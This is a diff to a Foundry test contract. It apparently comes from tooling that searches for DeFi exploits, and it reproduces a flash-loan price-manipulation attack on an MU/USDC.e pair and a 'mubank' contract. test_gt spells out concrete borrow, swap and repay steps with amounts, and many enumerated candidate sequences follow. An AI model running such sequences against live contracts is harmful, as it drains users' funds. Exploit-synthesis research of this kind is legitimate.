@@ -79,8 +79,6 @@ contract MUMUGTest is Test, BlockLoader {
         usdce.transfer(address(pair), balanceOfusdcepair);
         mu.transfer(address(pair), balanceOfmupair);
         mu.transfer(address(mubank), balanceOfmumubank);
-        usdce.approve(attacker, UINT256_MAX);
-        mu.approve(attacker, UINT256_MAX);
     }
 
     function printBalance(string memory tips) public {
@@ -141,20 +139,48 @@ contract MUMUGTest is Test, BlockLoader {
         return;
     }
 
-    function borrow_usdce(uint256 amount) internal {
-        usdce.transferFrom(owner, attacker, amount);
+    function borrow_owner_usdce(uint256 amount) internal {
+        vm.stopPrank();
+        vm.prank(owner);
+        usdce.transfer(attacker, amount);
+        vm.startPrank(attacker);
     }
 
-    function payback_usdce(uint256 amount) internal {
+    function payback_owner_usdce(uint256 amount) internal {
         usdce.transfer(owner, amount);
     }
 
-    function borrow_mu(uint256 amount) internal {
-        mu.transferFrom(owner, attacker, amount);
+    function borrow_owner_mu(uint256 amount) internal {
+        vm.stopPrank();
+        vm.prank(owner);
+        mu.transfer(attacker, amount);
+        vm.startPrank(attacker);
     }
 
-    function payback_mu(uint256 amount) internal {
+    function payback_owner_mu(uint256 amount) internal {
         mu.transfer(owner, amount);
+    }
+
+    function borrow_pair_usdce(uint256 amount) internal {
+        vm.stopPrank();
+        vm.prank(address(pair));
+        usdce.transfer(attacker, amount);
+        vm.startPrank(attacker);
+    }
+
+    function payback_pair_usdce(uint256 amount) internal {
+        usdce.transfer(address(pair), amount);
+    }
+
+    function borrow_pair_mu(uint256 amount) internal {
+        vm.stopPrank();
+        vm.prank(address(pair));
+        mu.transfer(attacker, amount);
+        vm.startPrank(attacker);
+    }
+
+    function payback_pair_mu(uint256 amount) internal {
+        mu.transfer(address(pair), amount);
     }
 
     function swap_pair_usdce_mu(uint256 amount) internal {
@@ -196,13 +222,13 @@ contract MUMUGTest is Test, BlockLoader {
 
     function test_gt() public {
         vm.startPrank(attacker);
-        borrow_mu(99000e18);
+        borrow_owner_mu(99000e18);
         printBalance("After step0 ");
         swap_pair_mu_usdce(99000e18);
         printBalance("After step1 ");
         swap_mubank_usdce_mu(22960e18);
         printBalance("After step2 ");
-        payback_mu(99297e18);
+        payback_owner_mu(99297e18);
         printBalance("After step3 ");
         require(attackGoal(), "Attack failed!");
         vm.stopPrank();
@@ -216,15 +242,111 @@ contract MUMUGTest is Test, BlockLoader {
     ) public {
         vm.startPrank(attacker);
         vm.assume(amt3 == (amt0 * 1003) / 1000);
-        borrow_mu(amt0);
+        borrow_owner_mu(amt0);
         swap_pair_mu_usdce(amt1);
         swap_mubank_usdce_mu(amt2);
-        payback_mu(amt3);
+        payback_owner_mu(amt3);
         assert(!attackGoal());
         vm.stopPrank();
     }
 
-    function check_cand000(
+    function check_cand000(uint256 amt0, uint256 amt1) public {
+        vm.startPrank(attacker);
+        vm.assume(amt1 == (amt0 * 1003) / 1000);
+        borrow_owner_usdce(amt0);
+        payback_owner_usdce(amt1);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand001(uint256 amt0, uint256 amt1) public {
+        vm.startPrank(attacker);
+        vm.assume(amt1 == (amt0 * 1003) / 1000);
+        borrow_owner_mu(amt0);
+        payback_owner_mu(amt1);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand002(uint256 amt0, uint256 amt1) public {
+        vm.startPrank(attacker);
+        vm.assume(amt1 == (amt0 * 1003) / 1000);
+        borrow_pair_usdce(amt0);
+        payback_pair_usdce(amt1);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand003(uint256 amt0, uint256 amt1) public {
+        vm.startPrank(attacker);
+        vm.assume(amt1 == (amt0 * 1003) / 1000);
+        borrow_pair_mu(amt0);
+        payback_pair_mu(amt1);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand004(uint256 amt0, uint256 amt1) public {
+        vm.startPrank(attacker);
+        vm.assume(amt1 == (amt0 * 1003) / 1000);
+        borrow_owner_usdce(amt0);
+        sync_pair();
+        payback_owner_usdce(amt1);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand005(uint256 amt0, uint256 amt1) public {
+        vm.startPrank(attacker);
+        vm.assume(amt1 == (amt0 * 1003) / 1000);
+        borrow_owner_mu(amt0);
+        sync_pair();
+        payback_owner_mu(amt1);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand006(uint256 amt0, uint256 amt1, uint256 amt2) public {
+        vm.startPrank(attacker);
+        vm.assume(amt2 == (amt0 * 1003) / 1000);
+        borrow_owner_mu(amt0);
+        swap_pair_mu_usdce(amt1);
+        payback_owner_mu(amt2);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand007(uint256 amt0, uint256 amt1) public {
+        vm.startPrank(attacker);
+        vm.assume(amt1 == (amt0 * 1003) / 1000);
+        borrow_pair_usdce(amt0);
+        sync_pair();
+        payback_pair_usdce(amt1);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand008(uint256 amt0, uint256 amt1) public {
+        vm.startPrank(attacker);
+        vm.assume(amt1 == (amt0 * 1003) / 1000);
+        borrow_pair_mu(amt0);
+        sync_pair();
+        payback_pair_mu(amt1);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand009(uint256 amt0, uint256 amt1, uint256 amt2) public {
+        vm.startPrank(attacker);
+        vm.assume(amt2 == (amt0 * 1003) / 1000);
+        borrow_pair_mu(amt0);
+        swap_pair_mu_usdce(amt1);
+        payback_pair_mu(amt2);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand010(
         uint256 amt0,
         uint256 amt1,
         uint256 amt2,
@@ -232,15 +354,15 @@ contract MUMUGTest is Test, BlockLoader {
     ) public {
         vm.startPrank(attacker);
         vm.assume(amt3 == (amt0 * 1003) / 1000);
-        borrow_usdce(amt0);
+        borrow_owner_usdce(amt0);
         swap_mubank_usdce_mu(amt1);
         swap_pair_mu_usdce(amt2);
-        payback_usdce(amt3);
+        payback_owner_usdce(amt3);
         assert(!attackGoal());
         vm.stopPrank();
     }
 
-    function check_cand001(
+    function check_cand011(
         uint256 amt0,
         uint256 amt1,
         uint256 amt2,
@@ -248,15 +370,26 @@ contract MUMUGTest is Test, BlockLoader {
     ) public {
         vm.startPrank(attacker);
         vm.assume(amt3 == (amt0 * 1003) / 1000);
-        borrow_usdce(amt0);
+        borrow_owner_usdce(amt0);
         swap_pair_usdce_mu(amt1);
         swap_pair_mu_usdce(amt2);
-        payback_usdce(amt3);
+        payback_owner_usdce(amt3);
         assert(!attackGoal());
         vm.stopPrank();
     }
 
-    function check_cand002(
+    function check_cand012(uint256 amt0, uint256 amt1, uint256 amt2) public {
+        vm.startPrank(attacker);
+        vm.assume(amt2 == (amt0 * 1003) / 1000);
+        borrow_owner_mu(amt0);
+        sync_pair();
+        swap_pair_mu_usdce(amt1);
+        payback_owner_mu(amt2);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand013(
         uint256 amt0,
         uint256 amt1,
         uint256 amt2,
@@ -264,15 +397,15 @@ contract MUMUGTest is Test, BlockLoader {
     ) public {
         vm.startPrank(attacker);
         vm.assume(amt3 == (amt0 * 1003) / 1000);
-        borrow_mu(amt0);
+        borrow_owner_mu(amt0);
         swap_pair_mu_usdce(amt1);
-        swap_mubank_usdce_mu(amt2);
-        payback_mu(amt3);
+        swap_pair_mu_usdce(amt2);
+        payback_owner_mu(amt3);
         assert(!attackGoal());
         vm.stopPrank();
     }
 
-    function check_cand003(
+    function check_cand014(
         uint256 amt0,
         uint256 amt1,
         uint256 amt2,
@@ -280,82 +413,10 @@ contract MUMUGTest is Test, BlockLoader {
     ) public {
         vm.startPrank(attacker);
         vm.assume(amt3 == (amt0 * 1003) / 1000);
-        borrow_mu(amt0);
-        swap_pair_mu_usdce(amt1);
-        swap_pair_usdce_mu(amt2);
-        payback_mu(amt3);
-        assert(!attackGoal());
-        vm.stopPrank();
-    }
-
-    function check_cand004(
-        uint256 amt0,
-        uint256 amt1,
-        uint256 amt2,
-        uint256 amt3,
-        uint256 amt4
-    ) public {
-        vm.startPrank(attacker);
-        vm.assume(amt4 == (amt0 * 1003) / 1000);
-        borrow_usdce(amt0);
-        swap_mubank_usdce_mu(amt1);
-        swap_pair_mu_usdce(amt2);
-        swap_pair_mu_usdce(amt3);
-        payback_usdce(amt4);
-        assert(!attackGoal());
-        vm.stopPrank();
-    }
-
-    function check_cand005(
-        uint256 amt0,
-        uint256 amt1,
-        uint256 amt2,
-        uint256 amt3,
-        uint256 amt4
-    ) public {
-        vm.startPrank(attacker);
-        vm.assume(amt4 == (amt0 * 1003) / 1000);
-        borrow_usdce(amt0);
-        swap_pair_usdce_mu(amt1);
-        swap_pair_mu_usdce(amt2);
-        swap_pair_mu_usdce(amt3);
-        payback_usdce(amt4);
-        assert(!attackGoal());
-        vm.stopPrank();
-    }
-
-    function check_cand006(
-        uint256 amt0,
-        uint256 amt1,
-        uint256 amt2,
-        uint256 amt3,
-        uint256 amt4
-    ) public {
-        vm.startPrank(attacker);
-        vm.assume(amt4 == (amt0 * 1003) / 1000);
-        borrow_mu(amt0);
+        borrow_owner_mu(amt0);
         swap_pair_mu_usdce(amt1);
         swap_mubank_usdce_mu(amt2);
-        swap_pair_mu_usdce(amt3);
-        payback_mu(amt4);
-        assert(!attackGoal());
-        vm.stopPrank();
-    }
-
-    function check_cand007(
-        uint256 amt0,
-        uint256 amt1,
-        uint256 amt2,
-        uint256 amt3,
-        uint256 amt4
-    ) public {
-        vm.startPrank(attacker);
-        vm.assume(amt4 == (amt0 * 1003) / 1000);
-        borrow_mu(amt0);
-        swap_pair_mu_usdce(amt1);
-        swap_pair_usdce_mu(amt2);
-        swap_pair_mu_usdce(amt3);
-        payback_mu(amt4);
+        payback_owner_mu(amt3);
         assert(!attackGoal());
         vm.stopPrank();
     }
